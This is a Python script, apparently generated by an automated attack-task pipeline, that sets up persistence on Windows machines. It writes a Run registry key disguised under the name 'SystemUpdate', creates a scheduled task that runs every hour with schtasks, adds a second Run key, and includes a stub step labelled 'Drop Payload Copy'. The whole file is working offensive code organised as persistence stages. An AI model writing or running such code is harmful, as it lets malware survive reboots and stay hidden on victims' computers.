#!/usr/bin/env python3
import sys
import json
import time
import os
import winreg
import subprocess
from typing import Dict, Any

def task_T1(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
    value_name = 'SystemUpdate'
    value_data = sys.executable if sys.executable else os.path.abspath(sys.argv[0])
    
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
            # Verify by reading back
            registered_value, _ = winreg.QueryValueEx(key, value_name)
            if registered_value == value_data:
                result = {
                    'key_path': key_path,
                    'value_name': value_name,
                    'value_data': value_data
                }
            else:
                result = {
                    'key_path': key_path,
                    'value_name': value_name,
                    'value_data': None
                }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}
    except Exception as e:
        result = {
            'key_path': key_path,
            'value_name': value_name,
            'value_data': None
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T1', 'execution_time': time.time()-start}}

def task_T2(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    input_data = input_data or {}
    task_name = "MyScheduledTask"
    execution_time = 60  # in minutes
    task_created = False
    registered = False

    try:
        # Create a scheduled task using schtasks
        command = [
            'schtasks', '/create', '/tn', task_name, '/tr', sys.executable,
            '/sc', 'minute', '/mo', str(execution_time), '/f'
        ]
        result = subprocess.run(command, capture_output=True, text=True, timeout=30)
        if result.returncode == 0:
            task_created = True

        # Register the task in the Windows Registry for persistence
        key_name = "MyScheduledTask"
        exe_path = sys.executable

        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r'Software\Microsoft\Windows\CurrentVersion\Run',
                            0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
            # Verify registration
            registered_value, _ = winreg.QueryValueEx(key, key_name)
            if registered_value == exe_path:
                registered = True

        # Prepare the result
        result = {
            "task_name": task_name if task_created else None,
            "execution_time": execution_time if task_created else None
        }
        return {'success': True, 'data': result,
                'metadata': {'task_id': 'T2', 'execution_time': time.time() - start}}
    except Exception as e:
        result = {
            "task_name": None,
            "execution_time": None
        }
        return {'success': False, 'data': result, 'error': f'{type(e).__name__}: {e}',
                'metadata': {'task_id': 'T2', 'execution_time': time.time() - start}}

def task_T3(input_data: Dict[str, Any] = None) -> Dict[str, Any]:
    start = time.time()
    try:
        result = {
        "file_path": "<string>",
        "hidden": "<boolean>"
}
        return {"success": True, "data": result,
                "metadata": {"task_id": "T3", "execution_time": time.time()-start, "is_stub": True}}
    except Exception as e:
        return {"success": False, "error": f"{type(e).__name__}: {e}",
                "metadata": {"task_id": "T3", "execution_time": time.time()-start}}

def main() -> dict:
    """Auto-generated orchestrator — do not edit by hand."""
    outputs: dict = {}
    results: dict = {}
    failed:  list = []
    
    # ── T1: Create Registry Run Key [persistence] ──
    try:
        r = task_T1(None)
        results['T1'] = r
        if r.get('success'):
            outputs['T1'] = r.get('data', {})
            print(f'[+] T1 (Create Registry Run Key): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T1 (Create Registry Run Key): FAILED — {err}')
            failed.append('T1')
    except Exception as e:
        print(f'[!] T1 crashed: {e}')
        failed.append('T1')
        results['T1'] = {'success': False, 'error': str(e)}
    
    # ── T2: Create Scheduled Task [persistence] ──
    try:
        r = task_T2(None)
        results['T2'] = r
        if r.get('success'):
            outputs['T2'] = r.get('data', {})
            print(f'[+] T2 (Create Scheduled Task): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T2 (Create Scheduled Task): FAILED — {err}')
            failed.append('T2')
    except Exception as e:
        print(f'[!] T2 crashed: {e}')
        failed.append('T2')
        results['T2'] = {'success': False, 'error': str(e)}
    
    # ── T3: Drop Payload Copy [persistence] ──
    try:
        r = task_T3(None)
        results['T3'] = r
        if r.get('success'):
            outputs['T3'] = r.get('data', {})
            print(f'[+] T3 (Drop Payload Copy): OK')
        else:
            err = r.get('error', 'unknown')
            print(f'[-] T3 (Drop Payload Copy): FAILED — {err}')
            failed.append('T3')
    except Exception as e:
        print(f'[!] T3 crashed: {e}')
        failed.append('T3')
        results['T3'] = {'success': False, 'error': str(e)}
    
    success = len(failed) == 0
    if success:
        print('[+] All tasks completed successfully')
    else:
        print(f'[-] Failed tasks: {failed}')
    return {'success': success, 'failed': failed,
            'outputs': outputs, 'results': results}

if __name__ == '__main__':
    import json
    result = main()
    print('__RESULT__=' + json.dumps(result))